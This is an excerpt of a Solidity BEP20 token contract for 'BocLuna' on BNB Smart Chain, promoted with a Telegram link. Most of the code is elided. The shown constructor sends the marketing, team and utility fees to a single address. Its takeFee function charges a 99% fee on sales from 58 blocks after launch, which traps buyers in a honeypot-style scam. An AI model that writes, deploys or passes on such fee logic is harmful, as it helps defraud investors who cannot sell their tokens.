...
TG: https://t.me/Brotherofnewcommunitylunabsc
...
contract BocLuna is IBEP20, Auth {
    using SafeMath for uint256;
    ...
    string constant _name = "Brother Of New Community Luna Bsc";
    string constant _symbol = "BocLuna";
    ...
    constructor () Auth(msg.sender) {
        ...
        marketingFeeReceiver = 0x693F80DE702e1A89cE4a4f883743d8B3AE1ef7Ff;
        teamFeeReceiver = 0x693F80DE702e1A89cE4a4f883743d8B3AE1ef7Ff;
        utilityFeeReceiver = 0x693F80DE702e1A89cE4a4f883743d8B3AE1ef7Ff;
    ...
    function takeFee(address sender, uint256 amount, bool isSell) internal returns (uint256) {
        ...
        } else if(isSell && (launchedAt + 58 < block.number)){
            feeAmount = amount.div(100).mul(99);
        }
